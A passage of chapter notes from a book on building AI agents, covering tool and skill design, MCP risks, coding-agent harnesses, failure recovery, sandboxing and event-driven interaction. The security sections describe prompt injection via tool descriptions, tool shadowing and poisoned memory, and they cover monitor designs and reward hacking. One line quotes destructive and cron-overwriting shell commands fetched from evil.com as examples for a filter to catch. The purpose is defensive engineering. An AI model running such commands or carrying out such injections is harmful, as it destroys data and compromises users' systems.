- Even among dedicated tools, lean toward integration: one `read_document` with a `file_type` parameter beats `extract_pdf_text` / `extract_docx_content` / `extract_pptx_content`. Criteria for merging: functional similarity and overlapping usage scenarios.
- **Four cases where a dedicated tool is right:** security/permissions/auditing (production DB writes); hiding platform differences and giving better feedback (grep and find differ across macOS/Windows/Linux); extremely high call frequency; complex parameter structure.
- **Parameter complexity is the deciding factor most of the time.** Tool schemas are JSON, which models emit reliably and inference engines can even constrain-sample. Skills require the model to generate valid shell arguments and escape quotes under rules more intricate than JSON and OS-dependent - **Skills demand more of the model and fail first when parameters are complex.** Middle ground: have the Skill write structured arguments to a JSON file and pass the file path.
- **Skills are friendlier to human authors**: anyone can edit one without programming, and because there is no strict syntax, a local mistake stays local, unlike a malformed tool schema that can stop the whole Agent.
- Four decision dimensions: security and permissions; parameter complexity; frequency of change (frequently changing capabilities are far cheaper as Skills - editing text beats changing code, testing, redeploying); model capability (weaker models need structured schemas).
- **Form and disclosure are independent decisions.** Form fixes each capability's resident cost, how parameters pass, and who can edit it. Disclosure fixes how many capabilities face the model at once. All four combinations occur in practice.
- **Let code orchestrate tool calls.** Rather than one call per round with every intermediate result hauled back through the context, have the model emit one script; intermediate variables live in the execution environment and only the final result returns. Scraping many pages then bulk-extracting fields this way can cut tokens by about two orders of magnitude. Analogy: emailing your boss after every step versus getting the whole manual up front.

**Tool description.** The core is telling the model **when to use it**, not what it does. "Use when you need real-time information or unknown facts" beats "Search for relevant content".
- **Stating boundaries - what it cannot do, what inputs it rejects - is usually more important than stating capabilities**, because most failures come from the model not knowing the limits, not from not knowing the function.
- Parameter descriptions need concrete examples, not format names. Mid-task the model spends only a small share of attention on parameter formats. `+8613888888888 (China)` beats "use E.164".
- Describe return values and execution cost ("downloads the whole page, 5-10 s on large sites; if you only need metadata use `get_page_metadata`").
- Add 1-5 real invocation examples per tool: JSON Schema can express types but not calling patterns, seconds-vs-milliseconds conventions, or filter nesting. Reported accuracy gains around 72% -> 90% on some benchmarks.
- **Debugging rule: when the Agent keeps picking the wrong tool, suspect the descriptions before the model.** Fixing descriptions usually pays better than upgrading the model.

**Fidelity of parameter passing.** The most insidious anti-pattern is **silent input transformation**. A real case: an edit tool's parameter layer silently converted Chinese curly quotes to straight quotes, while the read tool returned them unchanged - so the model passed back exactly what it read, got "no match found", and had no way to diagnose it. Same in the write direction, and the same class of bug as **silent parameter injection** (a bash tool appending a flag to every `git commit`, which fails on older Git while the model reworks the commit message forever). Principle: **there must be no systematic discrepancy between the world the model perceives and the world the tool operates on.** If normalization is necessary, document it in the description and state it in the return value.

### Ecosystem: MCP and Skill Hubs

- **MCP** (Anthropic, late 2024) is a client-server standard: JSON Schema tool descriptions, transport flexibility (stdio locally, Streamable HTTP remotely, SSE deprecated), and three primitives - **tools** (model executes), **resources** (application reads, no call needed), **prompts** (user-selected templates). Value: develop once, use in any compatible client.
- **Skills need no protocol, only a registry**, since a skill is just a folder with `SKILL.md`. skills.sh (Vercel, Jan 2026) installs with `npx skills add <owner>/<repo>`; OpenClaw has ClawHub. MCP is moving toward serving skills over MCP too.
- **Token asymmetry:** an integrated MCP server puts every tool definition into *every session's* context; installing a skill copies a folder to disk and leaves only name and description resident - one to two orders of magnitude cheaper.
- **Third-party capability risks.** Three for MCP: **tool description poisoning** (the description enters the context verbatim, so it is prompt injection through the tool definition, effective every session); **malicious or compromised servers** (supply chain, including later updates); **tool shadowing** (a malicious server names its tool like a trusted one and captures the call and its sensitive parameters). Mitigations: review descriptions as untrusted input, pin versions and reject silent updates, least-privilege credentials per server, plus the Sidecar as a runtime backstop.
- **Skills are more dangerous than MCP**, because they carry the implementing code, which may run on the user's machine, and can pull more at runtime. Hub security scans are not a cure. Run untrusted Skills isolated and away from sensitive data.
- Simon Willison's **lethal trifecta** (private data access + untrusted content + external communication) is the frame for judging a tool combination's overall risk; the more servers you add, the likelier all three coexist, and persistent memory extends an attack's effect beyond the session.

### Too many tools

Once tools pass roughly a hundred, even frontier models start choosing wrong, flat injection burns tokens, and every tool-set change breaks the KV cache. Three increasingly on-demand answers:

1. **Hierarchical organization and on-demand loading.** Five MCP servers can cost tens of thousands of tokens, near 30% of a 200K window before the conversation starts. Cursor synchronizes descriptions to a folder and exposes only an index by default: **A/B measured 46.9% fewer tokens** on MCP-related tasks. Pi Coding Agent goes further and excludes MCP from its core, packaging capabilities as CLI tools with READMEs loaded through Skills; its `pi-mcp-adapter` extension exposes one ~200-token proxy tool and does search -> inspect -> call. Whether to use MCP as an interoperability protocol and whether to expose every schema at startup are **separate decisions**. Group tools by information-source type (search / read / parse / query) and state the taxonomy in the system prompt. Retrieval-based pre-filtering by semantic similarity: **Anthropic measured Opus 4 tool-use accuracy 49% -> 74%.**
2. **Proactive tool discovery.** Pre-filtering matches once, against the initial query, but "debug the file" can pull an unforeseeable cross-domain chain. MCP-Zero preloads no schemas: the Agent emits a structured need in its thinking ("GitHub server: search repositories and return metadata") and the system routes through two-level semantic matching (server then tool) before injecting - **reported ~98% token reduction versus full injection across ~2800 tools**. Two-level matching shrinks the space from thousands of tools to dozens of servers times dozens of tools and reduces cross-domain confusion. When both levels score below threshold, return an explicit "not found" so the Agent rephrases, improvises with basic tools, or creates a new tool (Ch9).
   - **Cache handling:** append the discovered schema at the end of the trajectory, keep the static prefix stable, and keep only tool names in the status bar. Crucially, "appended at the end" happens **only on the discovery turn**; afterwards the schema stays pinned in place and becomes ordinary history - re-injecting it every turn would defeat the point. Only TTL expiry or modifying/removing/reordering the loaded set forces recomputation. Native support: OpenAI `tool_search` + `defer_loading`, Anthropic `tool_reference`, Codex CLI BM25 `tool_search`.
   - So "tool definitions must sit at the front of the context" is no longer an iron rule. The cost is that models need post-training to handle definitions scattered through the trajectory.
3. **Skills as the lightest answer.** The whole embedding index plus retrieval meta-tool plus API primitive layer exists only because a dedicated tool is a *formal definition addressed to the model* that must be registered, retrieved, injected. Skills drop that premise: a thin catalogue, then read the entry you need, then follow its references down. Nobody reads a handbook cover to cover.

### Perception tools

- Default problem is output volume. Integrate context-aware compression at the tool level above a threshold (say 10,000 characters).
- **Search tools** return a structured candidate list (title, location, snippet), never concatenated full text, with pagination or cursors and the total count, so the Agent chooses what to read deeply.
- **Read tools** take offset/limit. **Truncation must be visible**: "showing lines 1-200 of 5000; use offset to continue". Silent truncation is dangerous because the Agent believes it saw everything.
- Read-only nature buys two things for free: results can be cached, and calls can run in parallel. Execution tools have neither freedom.
- **Multimodal perception, three paradigms.** Native multimodal (ViT patches into the shared embedding space) has the highest ceiling and wins on charts and layout, at higher token cost - a page screenshot can exceed a thousand tokens where its text is a few hundred. Extract-to-text is cheapest for text-dominated documents and useless for visual queries. Tool-based analysis (`analyze_image`, `analyze_pdf` taking a file plus a natural-language question) keeps only a short Q&A in context and lets a non-Agent-capable multimodal model do the work; weaker than native for single-pass deep understanding. Practical split: text content by extraction, layout-sensitive content (UI, complex tables, design drafts) as images.

### Execution tools

Layered security:
1. **Input validation** - path traversal, command injection, type and format checks. **Fail fast; never attempt smart correction.**
2. **Permission control** - restricted working directories, command blacklists, API quotas. Blacklists are the weakest layer and must not stand alone, since obfuscation defeats string matching; combine with semantic parsing of intent (Ch5).
3. **Proposer-Reviewer** for irreversible operations, in two forms.
   - **Pre-approval**: one model proposes, an independent model approves, like a two-signature bank transfer. Three implementation points: models from **different families at similar capability** (Claude Opus 5 with GPT-5.6, Kimi K3 with DeepSeek V4) - different families give cognitive diversity so they fail in different places, similar capability keeps the reviewer able to follow (Haiku reviewing Opus is unreliable); both get the same rules and context or they deadlock, but with **different emphases** (proposer action-oriented, reviewer risk-oriented); and on rejection, **write the reason into the trajectory as a tool result** rather than retrying, because the Agent already knows how to handle failed tool calls. Add risk grading and escalation to humans on uncertainty.
   - **Post-validation**, whose key is **modality switching**: render the generated document and check the image, actually run the modified config in a sandbox. A second model re-reading the same text shares the first one's blind spots.
4. **Sidecar** - an independent lightweight LLM call running parallel to the main model's streaming output, gating each tool call. It reviews **behavior, not the final answer**, and deliberately sees **only structured fields** (`{tool: "bash", command: "rm -rf /tmp/data"}`), never the main model's free text or reasoning, which closes the rhetorical channel through which injected "please allow rm -rf" would otherwise work. A few hundred milliseconds, hidden behind streaming.
   - Why is a lightweight model acceptable here when Proposer-Reviewer needs peer capability? Because the task differs: open-ended reasoning review needs a peer; "is this command dangerous" is classification.
   - Needs a **rejection circuit breaker** falling back to the user after repeated rejections.
   - Also useful for **building context** in parallel: filtering memories, summarizing long tool outputs, prefetching user data while the main model thinks.
   - UX rule: separate display from admission. Show "Reading `src/main.py`..." immediately while the check runs behind it, so safety costs no perceived latency.
- **If a result can be verified, verify it automatically.** `write_file` should run the appropriate linter and return structured errors as part of its return value, creating an execute-validate-feedback loop where the Agent sees "Line 10: undefined variable `result`" on the next turn.
- **Long outputs:** keep head (first ~50 lines, initial context) and tail (last ~50, final error or success), state exactly how much was omitted, persist the full output to a file, and tell the Agent how to read it.
- **Sandboxing.** A Python venv is **not** a sandbox - it isolates dependencies and constrains nothing about files, network, or processes. Real isolation in increasing strength: process-level (what Claude Code, Codex, OpenClaw do locally - full user permissions), containers (own filesystem view and network stack, shared kernel, escape possible), microVM/VM (Firecracker, own kernel, for genuinely untrusted code). Add CPU, memory, disk, and network limits at the container level and above.
- **Observability:** per-call logs (time, parameters, result, duration), audit trails (who, in what context, why), metrics, and alerts on failures, timeouts, resource overruns.
- **Idempotency and cancellation semantics** - the question perception tools never face: **when a call times out or is cancelled, did the side effect happen?** A transfer that returns a network error may already have moved the money. Two designs: a client-generated **idempotency key** the server deduplicates on, or **query before mutation**. For operations that cannot be idempotent (sending email, placing a call, transferring out), use **two-phase pre-check then confirm**: phase one validates with a different-family model and a dedicated safety prompt (balance, recipient, content); phase two executes, and on failure returns the detailed error to the main model for replanning rather than blind retry.

### Collaboration tools

- Value of sub-agents: parallelism first, **specialization** second - independent prompt, toolset, and knowledge per role, without conflicts.
- Sub-agent prompt essentials: explicit role; **labeled context sources** (`[FROM_MAIN_AGENT]`, `[FROM_USER]`, `[TOOL_RESULT]`) which also blunts injection; explicit task boundaries including what to hand off or escalate; standardized output format, which both forces coverage and eases the parent's parsing.
- Three primitive groups: spawn and cancel (`cancel_subagent` matters - kill work whose purpose is gone rather than burning tokens); message passing in both directions during execution; and discovery (`list_agents`, the Agent-level analogue of MCP `tools/list`).
- Collaboration modes: synchronous, asynchronous (task ID plus completion event), streaming (when the process itself is valuable), multi-turn.
- **Human-in-the-loop** needs timeouts with defaults ("no response in 5 minutes, take the conservative path") and priority-based channel routing. Make it a learning loop, not a one-off: approvals, rejections, and reasons are evidence - generalizable judgments become knowledge or Skills, implicit high-dimensional preferences become post-training data (Ch9).

## Chapter 5: Coding Agent and code generation

https://github.com/bojieli/ai-agent-book/blob/main/book-en/chapter5.md

**Thesis: a general-purpose Agent for open-ended tasks is a Coding Agent plus a file system.** Manus and OpenClaw both take this shape. Code is a **meta-capability** - the ability to create capabilities at runtime - and it serves on two levels: as a medium for thinking it forces rigor ("age over 18 and identity verified" has one reading in code, several in prose), and as a medium for expression it proves its own consistency by running.

### The Coding Agent

- **Seven core tools:** code interpreter, bash, read, write, edit, glob (filename), grep (content). Codex gets by with bash alone; the seven are a normalized reference set, not a minimum.
- Why the coding core rather than Deep Research or Computer Use: almost all efficient content generation reduces to code. PPTX and DOCX are OOXML; PDFs come from Markdown, HTML, or LaTeX; analysis is Python; successful GUI sequences can be frozen into code; and where an API exists it is cheaper, faster, and more reliable than Computer Use.
- **File system as the hub.** Memory read from `MEMORY.md`, artifacts written to files, experience saved as files. Markdown over a vector DB because the user can open and correct it, chronology is preserved (semantic retrieval confuses time), and Git gives history and rollback.
- **Boundary of the claim:** this holds for open-ended general-purpose Agents. A vertical customer-service Agent has a closed task space and builds around fixed processes and domain tools, where code is one tool rather than the hub - though still important for exact calculation and rule verification.
- **Project instruction files** (`CLAUDE.md`, `AGENTS.md`, `.cursorrules`) are project-level system prompts injected every session, carrying behavior conventions rather than human-facing documentation: build and test commands, style rules, restricted zones. They are also the cheapest stable prefix. OpenClaw splits this into `SOUL.md` (who the Agent is) and `MEMORY.md` (accumulated experience).
- **Gauge of AI-readiness: can a remote newcomer start working independently from the repository and its documentation alone?**
- Recommended workflow, trimmed per task: read or write project documentation -> clarify requirements (for "optimize performance", establish which metric, which trade-offs are acceptable, where the bottleneck is) -> design document (cheap human intervention point: reviewing a design beats reviewing hundreds of lines) -> implement -> **test-fix loop** -> self-review -> sync documentation. **The most common way a Coding Agent slacks off is skipping the test stage and reporting completion.** Define "tests pass", not "code written", as the completion criterion.
- Models differ in when they stop gathering information and start acting - some read broadly before the first edit, others patch early and treat compiler and test feedback as investigation. This threshold follows the *model* across harnesses, so it is learned behavior, not a product's interface style; the harness can amplify or suppress it.

### Harness engineering, concretely

Four components: **acceptance baseline** (what "done" means: tests, CI, review standards), **execution boundary** (what may be touched), **feedback signals** (linter, tests, type errors), **rollback** (Git, sandbox, snapshots).

**Why coding is the best Harness domain** - the two-by-two of goal clarity against verification automation:

| | Auto-verifiable | Manual verification |
|---|---|---|
| **Clear goal** | Sweet spot: fixing a bug with tests | Throughput-limited: refactoring needing review |
| **Vague goal** | Efficiently going off track: "improve code quality" via linter | Hard to start: "make the UI look better" |

Coding sits in the sweet spot not because code models are special but because **decades of software engineering infrastructure already constitute a robust Harness.** The Harness's job in any domain is to push tasks into that quadrant.

Four transferable principles: **constraints over guidance** (a linter rule means "cannot", a system-prompt request means "advised against"); **automate verification** (human review is an unscalable bottleneck); **feedback fast and structured**; **rollback must be reliable** (Agents can only experiment boldly inside a safety net).

**Constrain the process, not only the outcome.** Dropping and rebuilding the database does fix the database fault, and deleting all the code does make compilation pass. Destructive shortcuts always exist, and Agents route around restrictions written only into the final metric - this is the everyday form of reward hacking. So put dedicated checks on `rm -rf`, production deletion, and overwriting an unread file. Ch8's RLVP (reward the outcome, penalize the verified violation on the path) answers the same question from the training side.

**Fault boundaries:** faults propagate only within the same batch of parallel calls, never up to the parent. One missing file among three parallel reads fails that call alone.

### Failure and recovery

**Four failure layers:** API (429, overload, timeout, connection drop, output truncated at the token limit - infrastructure noise unrelated to the task); tool (hallucinated call, malformed arguments, execution exception, and worst, a tool returning the same error while the model retries unchanged); context (overflow, compaction failure, corrupted trajectory such as a tool call missing its result); control flow (no-progress loops and death spirals).

**Detection.** The first question is not "should we retry" but **"would retrying help"** - keep a mapping from error type to strategy rather than a blanket retry. Detect patterns, not just errors: hash tool name plus arguments into a **repeated-call fingerprint**, and keep a per-path consecutive-failure counter.
- A third class never raises an error and needs **liveness monitoring**: a streaming connection that silently stalls is more dangerous than one that drops, because SDK timeouts usually cover only connection setup. **Every long-lived connection needs a liveness signal, not just a connection timeout** - run an idle watchdog that kills and retries.
- Integrity monitoring repairs unpaired tool calls before injecting context. Note the "lenient in production, strict in training" split: production may patch a missing message with a placeholder, but training-data collection must refuse, because synthetic placeholders pollute training data.

**Recovery escalates through increasing visibility:** (1) **silent retry** with exponential backoff plus jitter, honoring server-suggested waits, and distinguishing foreground from background calls so auxiliary retries (title generation, suggestions) do not crowd out the main loop and cause retry amplification; (2) **degrade and continue** - resend with a raised output cap, then ask the model to continue from the breakpoint, or fall back to another model after stripping the previous vendor's proprietary blocks; (3) **surface to the user**, together with what was already attempted.
- Tool errors take a different path: **do not terminate, turn the error into model input.** Hallucinated tool -> structured "no such tool"; validation failure -> error annotated with the input contract; a string where an object was expected -> repaired programmatically.
- **The unit of error handling is the recovery loop, not the request.** Withhold intermediate errors from users and downstream subscribers until recovery is confirmed impossible.

**Cross-vendor handover.** The obstacle is not the endpoint but that part of the trajectory belongs to one vendor. Tool calls and results are re-renderable; **reasoning splits into portable text and a non-portable credential** proving it came from that vendor. Vendors disagree on credential strictness, and the credential may be attached to the tool call rather than the reasoning, so "just delete all reasoning" fails at some vendors. Design for the strictest end with a fallback that rewrites historical tool calls as prose. **Principle: store trajectories in a neutral format, not any vendor's wire format** - regenerate identifiers per target, always discard the credential, carry the text (or the vendor's reasoning summary, which exists exactly for this) as ordinary content. The neutral trajectory is also what Ch7 evaluation replay, Ch8 training samples, and Ch9 experience extraction all consume.

**Termination.** Every recovery path needs a ceiling, and **thresholds come from production data, not guesswork**. Claude Code's compaction circuit breaker fires at 3 consecutive failures because real sessions showed one failing over three thousand times in a row, roughly 250,000 wasted API calls per day worldwide, with over a thousand sessions hitting 50+ streaks. Three is the empirical inflection point.
- The **death spiral** is worse than a single-point failure: a context-overflow error triggers a stop hook that commits code on exit, the hook calls the LLM to write a message, context overflows again, the hook fires again. Two defenses: **disable all model-invoking side effects on the error path** (better to lose auto-memory-extraction once), and a recursion-depth counter. Above everything sit global caps on turns and budget.

### Implementation techniques

- **Streaming plus parallelism:** start executing the first tool call the moment its arguments are complete and validated, overlapping with generation of the rest. Each tool declares whether it supports concurrency, defaulting to no.
- **Line numbers on file reads** so the model can reference "line 42 of `src/main.py`" and edits land reliably. Support line ranges rather than whole-file reads.
- **Dynamic environment injection** at the end of the context (never in the system prompt): working directory, Git branch, recent commits, staged and unstaged changes.
- **Persistent terminal session** created at startup, preserving working directory, environment variables, and activated virtualenvs, since a fresh shell per command loses all of it. Keep the ability to spawn isolated shells for parallel work.
- **Instant syntax feedback:** run the linter as part of the write tool's return, so the error surfaces on the next turn rather than at test time.

**Search tools compared:** regex/grep (exact, fast, semantics-blind - "user authentication" never finds a login function that lacks the word); glob (path structure only, fastest, the first step in exploring a project); semantic search (needs structure-aware chunking by function or class and hybrid retrieval with reranking; suits exploratory queries); symbol-level definition and reference lookup (distinguishes a definition from a call, unlike text search; not used by mainstream Coding Agents today). **Industry has converged away from embedding indexes**: Claude Code deliberately never built one, avoiding staleness and indexing infrastructure in favor of agentic grep plus glob, and Cursor, which originally paid for indexes to get cross-file semantic recall, has since switched to on-the-fly retrieval too.

**File editing, five schemes:**
- **Diff description plus apply model** - main model emits a skeleton with omission markers, a small fast model merges. Fragile in the merge step naively, but Cursor made it work with a trained fast-apply model and speculative decoding (using the original file as the draft) at thousands of tokens per second.
- **Old string -> new string** (Claude Code): predictable and unambiguous, but deleting a big block means emitting all of it, one character off fails, and duplicates need extra context.
- **Line-number targeting**: precise and compact for big deletions, but models miscount lines in long files, and numbers shift after each edit, limiting parallel edits.
- **Vim-like commands**: efficient for restructuring, but the syntax costs smaller models accuracy, and line numbers change after each command so batched edits are hard to plan. Deeper point: **Vim was designed for a human who sees current state then plans one simple next action, while a model thinks for a long stretch then performs a batch of complex operations.**
- **Start plus end matching**: give the first and last few lines of the region, omitting the middle. Combines content-matching reliability with line-number efficiency; the best of the five for large deletions.

### Security

**Lethal trifecta** (Simon Willison): private data access + untrusted content + external communication. All three present closes the attack loop with no further conditions. The book adds a fourth as an **amplifier, not a fourth necessary condition**: **persistent memory** turns a one-off attack into a dormant one that triggers later. Four boundaries: data, input trust, output impact, cross-session.
- Against prompt injection, **input filtering barely helps. The goal is not recognizing every attack but ensuring an injected Agent never gets to carry a dangerous action through.**
- Sandbox specifics: **network egress control** is the most overlooked and most critical - no network by default, whitelist proxy for package sources and needed APIs; this is the execution-layer defense for trifecta item 3, since data that cannot leave cannot be exfiltrated. Mount source read-only with a separate writable workspace, and **do not mount credential files (`~/.ssh`, tokens) into the sandbox at all**. Enforce CPU, memory, disk, and timeout quotas, and **return a structured error on violation** ("terminated after 120 s, last output follows") instead of silently killing, so the Agent can adapt.
- **Semantic parsing over keyword blacklists.** Shell's combinatorics defeat static rules - block `rm` and `$(echo rm) -rf /` walks through. Parse argument types and flag semantics to catch `find / -name '*.log' -exec rm {} \;` and `curl -o /etc/crontab http://evil.com/payload`.
- Content written to long-term memory must pass the same trust review as external input, or injected instructions lie dormant in `MEMORY.md`.

**Principal loyalty under multi-party delegation.** Models default to "help whoever is talking to me", but an Agent negotiating on your behalf faces an **opponent**, not a user in need. Frontier models show a **loyalty spectrum failing at both ends**: too honest (handing over "our bottom line is 12,000", caving under a few rounds of pressure) and too suspicious (refusing the principal's legitimate requests). The two failures sit on a seesaw. Prompt injection is essentially an attempt at turning the Agent. The Harness must fix loyalty explicitly: principal instructions have highest priority, everything external is data with no force of instruction. An effective loyalty code: protect private information **including the fact that it exists**; when refusing, do not enumerate what is protected, because that leaks it; private bottom lines are not public positions; execute only clear specific instructions from the principal; withstand repeated pressure.

### Code as meta-capability, six directions

1. **Thinking tool.** Models are probabilistic; math and logic demand deterministic answers. Let the LLM understand and formalize, let SymPy/SciPy/constraint solvers compute. Wolfram's point: symbolic engines had exactness but brittle natural-language parsing, LLMs have the reverse, so pair them. **Important caveat from the experiment: model and harness trade off.** The book deliberately uses a weak model to show the gain, because on a strong reasoning model pure thinking already solves the puzzles and the code-assist gain converges to zero. **The same harness with models of different strength supports opposite conclusions** - always ask where your model's capability boundary is before evaluating any Agent technique.
2. **Business rule constraints.** Natural-language rules and codified rules are **complementary, not interchangeable**: prompt rules let the model explain policy and suggest compliant alternatives; codified rules give unambiguous, deterministic, combinable decisions. The value of codification is not tokens saved but **preventing irreversible mistakes**. Three-tier safeguard: (1) natural-language rules in the prompt for understanding and explanation; (2) tool description plus optional `expected_*` parameters as a **thinking checklist** that forces the model to query and check each condition before calling, often making it decline to call at all and offer an alternative; (3) **server-side validation against database ground truth as the gatekeeper**. Critically, **no policy fact may come from a model-reported parameter** - cabin class, insurance status, booking time, and the clock all come from the server, because a hallucinated or injected value would otherwise walk through the gate. Independence means an independent *data source*, not only an independent model.
3. **Multimedia generation.** GUIs are hostile to Agents (visual interpretation, precise pointer placement); code frameworks are ideal. **Proposer-Reviewer** is essential because **the Agent that wrote the code cannot see how it renders**: the Proposer writes Slidev/Blender code, the Reviewer renders and uses a vision model to produce **structured, actionable feedback** ("page 3: too dense, consider splitting"; "page 7: code font too small, raise to 14pt"), iterating to a quality bar or a round cap - Loop Engineering's two stop conditions. The **reason for two agents rather than one self-reviewing loop is context management**: the Reviewer sees only the latest renders, the Proposer accumulates only text feedback; one agent would accumulate rounds of images for dozens of pages and blow the window.
   - **Code generation vs generative models for artifacts:** ask whether the artifact has a compact precise description (a flange is five or six parameters, so code is a *lossless* expression; a potted plant or a face has near-unbounded intrinsic complexity), and whether precision is verifiable (a hole diameter with 0.05 mm tolerance can be programmatically measured against spec). Also **representation and editability**: code yields B-rep parametric solids with a feature tree that can drive CNC, generative models yield triangle meshes; "change M5 to M6" is one number on the code route and a full regeneration with drifting dimensions on the other. Mixing routes is valid - parametric geometry plus generative texture.
4. **System adapter.** Generate the glue on demand: read the API docs or a few real responses, build the client, handle nonstandard formats, translate the data model. Extends to systems with no API - operate the GUI via Computer Use once, then freeze the successful sequence into code, so **RPA is the system adapter for systems with no programmatic interface** (Ch9). Concrete instance: **adaptive log parsing** - the frontend reports a parse failure with a raw sample instead of showing an error, the Agent generates parser code, a virtual browser tests it and a vision model checks the visualization, then it hot-deploys. Related: read production trajectories with architecture docs and PRDs to produce structured problem reports plus **regression tests keyed to trajectory ID and interaction round**, then file the GitHub issue over MCP.
5. **Generative UI.** Letting the Agent emit executable HTML/JS is a real risk: prompt injection is the cause, browser data theft resembling XSS is the effect, and the whole thing should not be labelled XSS. **A2UI-style declarative protocols** have the Agent emit a JSON UI manifest that the client renders with its own trusted components - the diner orders from the menu instead of entering the kitchen. Distinguish **AG-UI** (CopilotKit), which despite the name is an event and transport protocol streaming execution state and can *carry* A2UI payloads. Declarative suits standard interactions; direct code generation remains better for custom visualization.
   - **HTML deliverables beat Markdown reports**: interactive demonstration, real data visualization, and a living artifact updated throughout the task rather than produced at the end. The author maintains a per-project interactive site serving three purposes: experiment data traceability (every prompt and raw LLM response inspectable, which surfaces data and judge biases), **internal health metric monitoring** (loss, gradient norm, learning rate, perplexity, and for RL reward, KL, policy entropy - these surface non-convergence and collapse far earlier than task accuracy does), and demonstrating how the system works.
   - **Dynamic forms beat text Q&A for clarification**: ten clarification points cost ten turns in text, and text cannot express dependencies between questions; a cascading form collects everything in one pass.
   - **Artifact pattern for SQL**: the Agent writes the query, the system executes it, the frontend renders it - **the data never passes through the LLM**, which is both faster and more accurate since models transcribe data badly. Guardrails still required: read-only credentials, parse and allow only approved `SELECT`, reject DDL/DML/multi-statement, bind user values server-side, cap time, rows, tables, and date ranges, and sandbox visualization code. **The Artifact pattern shortens the data path; it does not replace authorization or isolation.**
   - **Dynamic software breaks the classical security premise.** Application code used to be developed, reviewed, and deployed, then stayed stable, so authorization lived in the application layer. When an Agent can rewrite that layer at any time, a generated path may omit a check, expose a hidden field, or route around an existing check. **The goal cannot be "make sure the AI writes every check correctly"; it must be that permission constraints are unbypassable even when the AI writes incorrect code.** So **move the trust boundary down to the data layer**: row-level security, constraints and validators, controlled views and stored procedures, and an **access context bound by a trusted runtime** that generated code cannot forge and cannot bypass with a privileged credential. The application layer may pre-check for fast feedback, but the data layer keeps final authority, and every access path must go through it.
6. **Bootstrapping.** Self-repair first: OpenClaw's `doctor` handles expired tokens, stale lock files, and port conflicts with **deterministic checks like an ops script**, and only uses the LLM for the long tail - reading logs, interpreting configs, inferring root causes. Safe fixes auto-apply, risky ones need confirmation. For an Agent writing an Agent, the common flaws are ad hoc context management (trajectories stuffed in as plain text, cache ignored, loop boundary bugs), non-standard tool design, outdated model and API choices pulled from training data, and dead libraries. **The fix is not exhaustive rules in the prompt but providing a high-quality reference implementation to modify** - copy a validated Agent (its own code works) and make targeted changes, so the new Agent inherits sound architecture without every rule being spelled out.

## Chapter 6: Interaction - expanding observation and action spaces

https://github.com/bojieli/ai-agent-book/blob/main/book-en/chapter6.md

Chapters 2-5 expanded the **content** of the two spaces. This chapter expands their **modality** (text vs sound, screen, sensors; tokens vs speech, clicks, joints) and **timing** (Agent fetches vs world pushes; finish in one turn vs span turns, interruptible, preemptible).

**The premise being removed: the Agent and the world take turns speaking.** A model's training corpus is almost entirely turn-based, so the learned policy assumes the world waits. It does not: mail arrives mid-thought, the user cuts in, the page changed between screenshots, the cup is knocked while the arm reaches.

Four scales: async and event-driven (seconds to days), voice (10 ms - 1 s), Computer Use (sub-second to seconds), robotics (milliseconds). All four share one control skeleton and the same primitives: **wake-up, safe points, cancellation, preemption, fast/slow separation.**

### Async and event-driven

- **The core contradiction: synchronous training, asynchronous deployment.** The API demands that a tool call be followed by its result; reality delivers user interrupts and external events first. Every technique in this section patches that gap.
- OpenClaw provides Hooks (lifecycle), Cron, and Heartbeat, but all three are internal or time-driven; the real gap is **third-party event ingress**. The PineClaw case makes the cost concrete: a voice Agent on a live call needs the user's OTP within seconds for identity verification or a three-way handoff, and Heartbeat polling means the representative hangs up. **Proactive service requires not just that the Agent can check for events, but that events can notify the Agent.**
- **Event-triggered tools:** timers (one-shot for "call the bank Monday 10:00", recurring for polling services that cannot push), background task monitoring (`monitor_shell` - polling burns tokens, waiting for completion misses unfolding problems, and a hung command cannot be intervened in at all), and external channels. Define trigger conditions and filters so irrelevant events do not wake the Agent, and put enough context in the payload that the Agent need not immediately query more.
- **User communication tools** exist because "speaking" becomes an explicit action once channels multiply. Claude Code and Manus send every assistant message straight to the user in a session that exposes tool calls; OpenClaw instead uses dedicated messaging tools, hides sessions, and lets both sides send at any time, producing what people describe as human-like presence. Choose channel by urgency, user state, content, and preference. **Notification doubles as re-engagement**: notify on long-task completion, and periodic reports build interaction habits.
- **Virtual identity and isolated execution.** Direct management of the user's accounts means one Agent error exposes their whole digital identity; give the Agent its own accounts, storage, and compute, like a secretary with their own office phone. Transparency about the identity can make communication more authentic. Virtual computers and phones run around the clock without disturbing the user's device and contain failures. Two practical obstacles: anti-bot systems flag data-center IPs, so residential proxies are often needed; and for real-account access use **HITL authentication** over VNC/RDP where the user logs in personally and sees what the Agent is doing, then reuse the session token within its validity. Exchange data through a shared mount by **file path reference, never by copying content into context**.
- **Event loop and safe points.** Model the Agent as a loop that takes a batch of events, appends them, calls the LLM, executes tools, and repeats - the same shape as a Go `for { select { } }`. **Events are consumed only at round boundaries.** An arriving event waits for a **safe point** (end of a reasoning stretch, return of a tool call). Cancellation is the same discipline: check "was I asked to stop" at the safe point, as `ctx.Done()` does. The three strategies differ only in how they treat the safe point.
- **Structured event modeling** with source (user, contact, stranger, system), channel, content (text, tone, urgency, reply needed), and context (reply or new thread, relevance). Without it the Agent confuses user input with tool results, or treats a tool result carrying hidden instructions as a command.
- **Three strategies by urgency:**
  - **Cancellation-based** for urgent events - **forces a safe point early**: cancel the stream or signal the tool, drain the queue, append everything with the urgent event, re-invoke. This is what makes "Stop! I said the wrong thing" work.
  - **Queued** for routine events - append at the next natural safe point, which also batches ("only show results from the last month" arrives while a search runs, and both reach the model together).
  - **Parallel** for independent lightweight queries ("what's the weather?" during a long analysis) - run in a separate reasoning session and append the exchange to the main trajectory **explicitly marked as executed in parallel**.
  - Use a **lightweight classifier LLM as event router** rather than hardcoded rules, since semantics decide the strategy. A cancellation point must be somewhere the tool or reasoning can wind down safely, and **an unfinished tool result must be an explicit placeholder, never faked as success**.
- **Five rules for simulating synchrony:** (1) record the assistant message immediately; (2) record the tool result only on completion, leaving the trajectory partially complete meanwhile; (3) on interrupt during tool execution, insert a placeholder result ("executing in the background, prioritize the new event") so pairing stays valid; (4) on interrupt during thinking, discard the partial thought; (5) non-interrupting events queue for batch append. **Under normal conditions the model sees a perfect synchronous trajectory** and the placeholder appears only on a real interrupt.
  - Residual risk: **the placeholder can worsen hallucination**, because in training a tool call was always followed by a real result, so the model may fabricate one. Hence interrupt only on genuine urgency.
- **Design async semantics into the tool interface**: `initiate_phone_call` returning a task ID beats `phone_call`, because the name itself tells the model that initiation and completion are decoupled, and the description should reinforce it.
